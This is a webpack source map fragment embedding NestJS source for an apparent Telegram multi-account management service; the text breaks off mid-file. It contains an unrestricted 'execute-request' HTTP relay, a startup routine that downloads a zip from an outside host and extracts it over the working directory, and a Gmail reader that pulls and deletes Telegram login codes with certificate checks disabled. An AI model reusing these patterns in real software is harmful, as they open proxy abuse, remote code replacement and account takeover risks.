client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/dynamic-data/dto/create-dynamic-data.dto.ts",".././src/components/dynamic-data/dto/get-dynamic-data.dto.ts",".././src/components/dynamic-data/dto/update-dynamic-data.dto.ts",".././src/components/dynamic-data/dynamic-data.controller.ts",".././src/components/dynamic-data/dynamic-data.module.ts",".././src/components/dynamic-data/dynamic-data.schema.ts",".././src/components/dynamic-data/dynamic-data.service.ts",".././src/components/ip-management/client-ip-integration.controller.ts",".././src/components/ip-management/client-ip-integration.service.ts",".././src/components/ip-management/dto/assign-ip.dto.ts",".././src/components/ip-management/dto/create-proxy-ip.dto.ts",".././src/components/ip-management/dto/update-proxy-ip.dto.ts",".././src/components/ip-management/ip-management.controller.ts",".././src/components/ip-management/ip-management.module.ts",".././src/components/ip-management/ip-management.service.ts",".././src/components/ip-management/schemas/ip-mobile-mapping.schema.ts",".././src/components/ip-management/schemas/proxy-ip.schema.ts",".././src/components/n-point/index.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/index.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/index.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/index.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/session-manager/client-registry.ts",".././src/components/session-manager/index.ts",".././src/components/session-manager/schemas/sessions.schema.ts",".././src/components/session-manager/session-audit.service.ts",".././src/components/session-manager/session.controller.ts",".././src/components/session-manager/session.module.ts",".././src/components/session-manager/session.service.ts",".././src/components/shared/dto/execute-request.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/timestamps/timestamp.controller.ts",".././src/components/timestamps/timestamp.module.ts",".././src/components/timestamps/timestamp.service.ts",".././src/components/timestamps/timestamps.schema.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/interfaces/telegram.ts",".././src/main.ts",".././src/memory-cleanup.service.ts",".././src/middlewares/logger.middleware.ts",".././src/utils/TelegramBots.config.ts",".././src/utils/common.ts",".././src/utils/fetchWithTimeout.ts",".././src/utils/index.ts",".././src/utils/logbots.ts",".././src/utils/parseError.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external node-commonjs \"crypto\"","../external commonjs \"form-data\"","../external node-commonjs \"fs\"","../external commonjs \"https\"","../external commonjs \"imap\"","../external commonjs \"lodash\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external node-commonjs \"path\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"url\"","../webpack/bootstrap","../webpack/before-startup","../webpack/startup","../webpack/after-startup"],"sourcesContent":["import Imap from 'imap';\nimport { fetchNumbersFromString, sleep } from '../utils';\nimport { parseError } from '../utils/parseError';\n\nexport class MailReader {\n    private static instance: MailReader;\n    private imap: Imap;\n    private isReady: boolean = false;\n    private result: string = '';\n\n    private constructor() {\n        this.imap = new Imap({\n            user: process.env.GMAIL_ADD || '',\n            password: process.env.GMAIL_PASS || '',\n            host: 'imap.gmail.com',\n            port: 993,\n            tls: true,\n            tlsOptions: {\n                rejectUnauthorized: false,\n            },\n        });\n\n        this.imap.on('ready', () => {\n            console.log('Mail is Ready');\n            this.isReady = true;\n        });\n\n        this.imap.on('error', (err: Error) => {\n            console.error('SomeError:', err);\n            this.isReady = false;\n        });\n\n        this.imap.on('end', () => {\n            console.log('Connection ended');\n            this.isReady = false;\n        });\n    }\n\n    public static getInstance(): MailReader {\n        if (!MailReader.instance) {\n            MailReader.instance = new MailReader();\n        }\n        return MailReader.instance;\n    }\n\n    public async connectToMail(): Promise<void> {\n        console.log('Connecting to mail server');\n        try {\n            this.imap.connect();\n            this.isReady = true;\n            console.log('Connected to mail server');\n        } catch (err) {\n            console.error('Error connecting to mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async disconnectFromMail(): Promise<void> {\n        console.log('Disconnecting from mail server');\n        try {\n            this.imap.end();\n            this.isReady = false;\n            console.log('Disconnected from mail server');\n        } catch (err) {\n            console.error('Error disconnecting from mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async isMailReady(): Promise<boolean> {\n        return this.isReady;\n    }\n\n    public async getCode(): Promise<string> {\n        console.log(\"MailReady : \", this.isReady)\n        if (!this.isReady) {\n            console.log(\"Re-Connecting mail server\");\n            await this.connectToMail();\n            await sleep(10000);\n        }\n\n        try {\n            await this.openInbox();\n\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\n            console.log('Inbox Opened');\n\n            const results = await new Promise<any[]>((resolve, reject) => {\n                this.imap.search(searchCriteria, (err, results) => {\n                    if (err) {\n                        console.error('Search error:', parseError(err));\n                        reject(err);\n                    } else {\n                        resolve(results);\n                    }\n                });\n            });\n\n            if (results.length > 0) {\n                console.log('Emails found:', results.length);\n                const length = results.length;\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\n\n                await new Promise<void>((resolve, reject) => {\n                    fetch.on('message', (msg, seqno) => {\n                        const emailData: string[] = [];\n\n                        msg.on('body', (stream, info) => {\n                            let buffer = '';\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\n                            stream.on('end', () => {\n                                if (info.which === 'TEXT') {\n                                    emailData.push(buffer);\n                                }\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\n                                    if (err) reject(err);\n                                    this.imap.expunge((err) => {\n                                        if (err) reject(err);\n                                        console.log('Deleted message');\n                                    });\n                                });\n                            });\n                        });\n\n                        msg.once('end', () => {\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\n                            console.log('EmailDataLength:', emailData.length);\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\n                            resolve();\n                        });\n                    });\n\n                    fetch.once('end', () => {\n                        console.log('Fetched mails');\n                        resolve();\n                    });\n                });\n            } else {\n                console.log('No new emails found');\n            }\n\n            console.log('Returning result:', this.result);\n            return this.result;\n        } catch (error) {\n            console.error('Error:', error);\n            this.isReady = false;\n            throw error;\n        }\n    }\n\n    private async openInbox(): Promise<void> {\n        await new Promise<void>((resolve, reject) => {\n            this.imap.openBox('INBOX', false, (err) => {\n                if (err) {\n                    console.error('Open Inbox error:', parseError(err));\n                    reject(err);\n                } else {\n                    console.log('Inbox opened');\n                    resolve();\n                }\n            });\n        });\n    }\n}","import { Controller, Get, Post, Body, ValidationPipe, Logger, HttpException, HttpStatus, Res } from '@nestjs/common';\r\nimport { ApiOperation, ApiResponse, ApiTags } from '@nestjs/swagger';\r\nimport axios, { AxiosError, AxiosResponse } from 'axios';\r\nimport { ExecuteRequestDto } from './components/shared/dto/execute-request.dto';\r\nimport { randomUUID } from 'crypto';\r\nimport { Request, Response } from 'express';\r\nimport * as https from 'https';\r\nimport { URL } from 'url';\r\n\r\n@ApiTags('App')\r\n@Controller()\r\nexport class AppController {\r\n  private readonly logger = new Logger(AppController.name);\r\n  private readonly DEFAULT_TIMEOUT = 30000;\r\n  private readonly MAX_CONTENT_SIZE = 50 * 1024 * 1024; // 50MB\r\n\r\n  constructor() {}\r\n\r\n  @Get()\r\n  getHello(): string {\r\n    return 'Hello World!';\r\n  }\r\n\r\n  @Post('execute-request')\r\n  @ApiOperation({\r\n    summary: 'Execute an HTTP request with given details',\r\n    description: 'Makes an HTTP request to the specified URL with provided configuration and returns the response'\r\n  })\r\n  @ApiResponse({ status: 201, description: 'Request executed successfully' })\r\n  @ApiResponse({ status: 400, description: 'Invalid request parameters' })\r\n  @ApiResponse({ status: 429, description: 'Too many requests' })\r\n  @ApiResponse({ status: 500, description: 'Internal server error or request execution failed' })\r\n  async executeRequest(\r\n    @Body(new ValidationPipe({ \r\n      transform: true,\r\n      forbidNonWhitelisted: true,\r\n      whitelist: true\r\n    })) req: ExecuteRequestDto,\r\n    @Res() res: Response\r\n  ): Promise<any> {\r\n    const requestId = randomUUID();\r\n    const startTime = Date.now();\r\n\r\n    try {\r\n      const {\r\n        url,\r\n        method = 'GET',\r\n        headers = {},\r\n        data,\r\n        params,\r\n        responseType = 'json',\r\n        timeout = this.DEFAULT_TIMEOUT,\r\n        followRedirects = true,\r\n        maxRedirects = 5\r\n      } = req;\r\n\r\n      // Validate URL\r\n      if (!url) {\r\n        throw new HttpException('URL is required', HttpStatus.BAD_REQUEST);\r\n      }\r\n\r\n      // Validate URL format and protocol\r\n      try {\r\n        const parsedUrl = new URL(url);\r\n        if (!['http:', 'https:'].includes(parsedUrl.protocol)) {\r\n          throw new HttpException('Invalid URL protocol. Only HTTP and HTTPS are supported.', HttpStatus.BAD_REQUEST);\r\n        }\r\n      } catch (error) {\r\n        throw new HttpException('Invalid URL format', HttpStatus.BAD_REQUEST);\r\n      }\r\n\r\n      // Create custom HTTPS agent with security options\r\n      const httpsAgent = new https.Agent({\r\n        rejectUnauthorized: true // Verify SSL certificates\r\n      });\r\n\r\n      // Log sanitized request details\r\n      this.logger.log({\r\n        message: 'Executing HTTP request',\r\n        requestId,\r\n        details: {\r\n          url,\r\n          method,\r\n          headers: this.sanitizeHeaders(headers),\r\n          params,\r\n          responseType,\r\n          timeout,\r\n          dataSize: data ? JSON.stringify(data).length : 0\r\n        }\r\n      });\r\n\r\n      // Execute request with timeout and size limits\r\n      const response: AxiosResponse = await axios({\r\n        url,\r\n        method,\r\n        headers,\r\n        data,\r\n        params,\r\n        responseType,\r\n        timeout,\r\n        maxRedirects: followRedirects ? maxRedirects : 0,\r\n        maxContentLength: this.MAX_CONTENT_SIZE,\r\n        maxBodyLength: this.MAX_CONTENT_SIZE,\r\n        validateStatus: null, // Handle all status codes\r\n        decompress: true,\r\n        httpsAgent,\r\n        transitional: {\r\n          clarifyTimeoutError: true // Better timeout error messages\r\n        }\r\n      });\r\n\r\n      const executionTime = Date.now() - startTime;\r\n\r\n      // Log response metrics\r\n      this.logger.log({\r\n        message: 'Request completed',\r\n        requestId,\r\n        metrics: {\r\n          executionTime,\r\n          status: response.status,\r\n          contentType: response.headers['content-type'],\r\n          contentLength: response.headers['content-length']\r\n        }\r\n      });\r\n\r\n      // Set response headers\r\n      Object.entries(response.headers).forEach(([key, value]) => {\r\n        // Skip transfer-encoding as it might conflict with our response\r\n        if (key.toLowerCase() === 'transfer-encoding') return;\r\n        if (Array.isArray(value)) {\r\n          res.setHeader(key, value);\r\n        } else if (value) {\r\n          res.setHeader(key, value.toString());\r\n        }\r\n      });\r\n\r\n      // Set response status\r\n      res.status(response.status);\r\n\r\n      // Handle binary responses\r\n      if (this.isBinaryResponse(responseType, response.headers['content-type'])) {\r\n        if (!res.getHeader('content-type') && response.headers['content-type']) {\r\n          res.setHeader('content-type', response.headers['content-type']);\r\n        }\r\n        res.send(Buffer.from(response.data));\r\n        return;\r\n      }\r\n\r\n      // Return response for other types\r\n      res.send(response.data);\r\n      return;\r\n\r\n    } catch (error) {\r\n      const errorDetails = this.handleRequestError(error, requestId);\r\n      \r\n      // Log error details\r\n      this.logger.error({\r\n        message: 'Request failed',\r\n        requestId,\r\n        error: errorDetails\r\n      });\r\n\r\n      // Set error status code\r\n      res.status(errorDetails.status || HttpStatus.INTERNAL_SERVER_ERROR);\r\n\r\n      // Send error response\r\n      res.send(errorDetails);\r\n      return;\r\n    }\r\n  }\r\n\r\n  private sanitizeHeaders(headers: Record<string, string>): Record<string, string> {\r\n    const sensitiveHeaders = ['authorization', 'cookie', 'proxy-authorization', 'x-api-key'];\r\n    const sanitized = { ...headers };\r\n    \r\n    // Redact sensitive headers\r\n    sensitiveHeaders.forEach(header => {\r\n      Object.keys(sanitized).forEach(key => {\r\n        if (key.toLowerCase() === header.toLowerCase()) {\r\n          sanitized[key] = '[REDACTED]';\r\n        }\r\n      });\r\n    });\r\n\r\n    return sanitized;\r\n  }\r\n\r\n  private isBinaryResponse(responseType: string, contentType?: string): boolean {\r\n    if (responseType === 'arraybuffer') return true;\r\n    \r\n    if (contentType) {\r\n      const binaryTypes = [\r\n        'application/octet-stream',\r\n        'image/',\r\n        'audio/',\r\n        'video/',\r\n        'application/pdf',\r\n        'application/zip',\r\n        'application/x-zip-compressed',\r\n        'application/binary'\r\n      ];\r\n      \r\n      return binaryTypes.some(type => contentType.toLowerCase().includes(type.toLowerCase()));\r\n    }\r\n    \r\n    return false;\r\n  }\r\n\r\n  private handleRequestError(error: any, requestId: string): any {\r\n    if (axios.isAxiosError(error)) {\r\n      const axiosError = error as AxiosError;\r\n      \r\n      // Handle specific error types\r\n      if (axiosError.code === 'ECONNABORTED') {\r\n        return {\r\n          status: HttpStatus.GATEWAY_TIMEOUT,\r\n          error: 'Request timeout',\r\n          message: 'The request took too long to complete',\r\n          requestId\r\n        };\r\n      }\r\n\r\n      if (axiosError.code === 'ECONNREFUSED') {\r\n        return {\r\n          status: HttpStatus.BAD_GATEWAY,\r\n          error: 'Connection refused',\r\n          message: 'Could not connect to the target server',\r\n          requestId\r\n        };\r\n      }\r\n\r\n      if (axiosError.response) {\r\n        return {\r\n          status: axiosError.response.status,\r\n          headers: this.sanitizeHeaders(axiosError.response.headers as Record<string, string>),\r\n          data: axiosError.response.data,\r\n          requestId\r\n        };\r\n      }\r\n\r\n      if (axiosError.request) {\r\n        return {\r\n          status: HttpStatus.BAD_GATEWAY,\r\n          error: 'No response',\r\n          message: 'The request was made but no response was received',\r\n          code: axiosError.code,\r\n          requestId\r\n        };\r\n      }\r\n\r\n      return {\r\n        status: HttpStatus.BAD_GATEWAY,\r\n        error: axiosError.code || 'Request failed',\r\n        message: axiosError.message,\r\n        requestId\r\n      };\r\n    }\r\n\r\n    // Handle non-Axios errors\r\n    return {\r\n      status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n      error: 'Internal server error',\r\n      message: error.message || 'An unexpected error occurred',\r\n      requestId\r\n    };\r\n  }\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\nimport { InitModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/tg-signup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\nimport { TimestampModule } from './components/timestamps/timestamp.module';\nimport { DynamicDataModule } from './components/dynamic-data/dynamic-data.module';\nimport { MemoryCleanerService } from './memory-cleanup.service';\nimport { SessionModule } from './components/session-manager';\nimport { IpManagementModule } from './components/ip-management/ip-management.module';\n\n@Module({\n  imports: [\n    InitModule,\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    SessionModule,\n    IpManagementModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n    TimestampModule,\n    DynamicDataModule,\n  ],\n  providers: [MemoryCleanerService],\n  controllers: [AppController],\n  exports: [\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule,\n    TimestampModule,\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n  }\n}","console.log(\"in Cloudinary\");\nimport * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport AdmZip from 'adm-zip';\nimport { parseError } from './utils/parseError';\nimport { fetchWithTimeout } from './utils/fetchWithTimeout';\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const rootPath = process.cwd();\n        const zipPath = path.resolve(rootPath, 'temp.zip');\n        const extractPath = path.resolve(rootPath);\n    \n        console.log(`Starting download of zip file from ${url}`);\n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n            console.log('Zip file downloaded successfully.');\n            fs.writeFileSync(zipPath, response.data);\n            console.log(`Zip file saved to ${zipPath}`);\n            \n            // Extract the zip file using adm-zip\n            const zip = new AdmZip(zipPath);\n            console.log(`Extracting zip file to ${extractPath}`);\n            zip.extractAllTo(extractPath, true);\n            console.log('Zip file extracted successfully.');\n            \n            fs.unlinkSync(zipPath); // Remove the zip file after extraction\n            console.log(`Temporary zip file ${zipPath} deleted.`);\n        } else {\n            const errorMessage = `Unable to download zip file from ${url}`;\n            console.error(errorMessage);\n            throw new Error(errorMessage);\n        }\n    }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://cms.paidgirl.site/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log(result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(resource);\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(error);\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(mypath);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","export * from './configuration.schema';\nexport * from './init.controller';\nexport * from './init.module';\nexport * from './init.service';\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { ConfigurationService } from './init.service';\n\n@ApiTags('Configuration')\n@Controller('configuration')\nexport class ConfigurationController {\n  constructor(private readonly configurationService: ConfigurationService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get configuration data' })\n  async findOne(): Promise<any>{\n    return this.configurationService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update configuration' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.configurationService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global, OnModuleDestroy, OnModuleInit, Inject } from '@nestjs/common';\nimport { ConfigModule, ConfigService } from '@nestjs/config';\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\nimport { ConfigurationService } from './init.service';\nimport { ConfigurationSchema } from './configuration.schema';\nimport { ConfigurationController } from './init.controller';\nimport { Connection } from 'mongoose';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Global()\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      isGlobal: true,\n      cache: true,\n      expandVariables: true,\n      envFilePath: '.env',\n    }),\n    MongooseModule.forRootAsync({\n      imports: [ConfigModule],\n      useFactory: async (configService: ConfigService) => {\n        const uri = process.env.mongouri || configService.get<string>('mongouri');\n        if (!uri) {\n          throw new Error('MongoDB URI is not configured');\n        }\n\n        return {\n          uri,\n          maxPoolSize: 10,\n          serverSelectionTimeoutMS: 10000,\n          socketTimeoutMS: 45000,\n          connectTimeoutMS: 10000,\n          heartbeatFrequencyMS: 10000,\n          family: 4,\n          retryWrites: true,\n          retryReads: true,\n        };\n      },\n      inject: [ConfigService],\n    }),\n    MongooseModule.forFeature([{\n      name: 'configurationModule',\n      collection: 'configuration',\n      schema: ConfigurationSchema\n    }])\n  ],\n  providers: [ConfigurationService],\n  controllers: [ConfigurationController],\n  exports: [ConfigurationService, MongooseModule],\n})\nexport class InitModule implements OnModuleDestroy, OnModuleInit {\n  private static initializationStatus = {\n    isInitialized: false,\n    isInitializing: false,\n    isDestroying: false,\n  };\n\n  private connectionHealthCheckInterval?: NodeJS.Timeout;\n  private readonly HEALTH_CHECK_INTERVAL = 30000; // 30 seconds\n\n  constructor(\n    @Inject(getConnectionToken()) private readonly connection: Connection,\n    private readonly configService: ConfigService,\n  ) {}\n\n  async onModuleInit(): Promise<void> {\n    if (InitModule.initializationStatus.isInitializing || InitModule.initializationStatus.isInitialized) {\n      return;\n    }\n\n    InitModule.initializationStatus.isInitializing = true;\n\n    try {\n      console.log(`Initializing configuration module...`);\n\n      await this.validateConnection();\n      this.setupConnectionEventHandlers();\n      this.startHealthCheck();\n\n      InitModule.initializationStatus.isInitialized = true;\n      InitModule.initializationStatus.isInitializing = false;\n\n      console.log(`Started :: ${process.env.clientId}`);\n\n      // Optional: Send notification on successful startup\n      await this.sendNotification(`started :: ${process.env.clientId}`);\n\n    } catch (error) {\n      InitModule.initializationStatus.isInitializing = false;\n      console.error('Failed to initialize configuration module:', error);\n      throw error;\n    }\n  }\n\n  private async validateConnection(): Promise<void> {\n    const maxRetries = 3;\n    let retryCount = 0;\n\n    while (retryCount < maxRetries) {\n      try {\n        if (this.connection.readyState !== 1) {\n          throw new Error(`MongoDB connection not ready. Current state: ${this.connection.readyState}`);\n        }\n\n        // Test the connection with a simple operation\n        await this.connection.db.admin().ping();\n        console.log('MongoDB connection validated successfully');\n        return;\n\n      } catch (error) {\n        retryCount++;\n        console.warn(`Connection validation attempt ${retryCount}/${maxRetries} failed:`, error);\n\n        if (retryCount >= maxRetries) {\n          throw new Error(`Failed to validate MongoDB connection after ${maxRetries} attempts: ${error.message}`);\n        }\n\n        // Wait before retrying\n        await this.delay(2000 * retryCount);\n      }\n    }\n  }\n\n  private setupConnectionEventHandlers(): void {\n    this.connection.on('connected', () => {\n      console.log('MongoDB Connected');\n    });\n\n    this.connection.on('error', (error) => {\n      console.error('MongoDB Connection Error:', error);\n    });\n\n    this.connection.on('disconnected', () => {\n      console.warn('MongoDB Disconnected');\n    });\n\n    this.connection.on('reconnected', () => {\n      console.log('MongoDB Reconnected');\n    });\n\n    this.connection.on('close', () => {\n      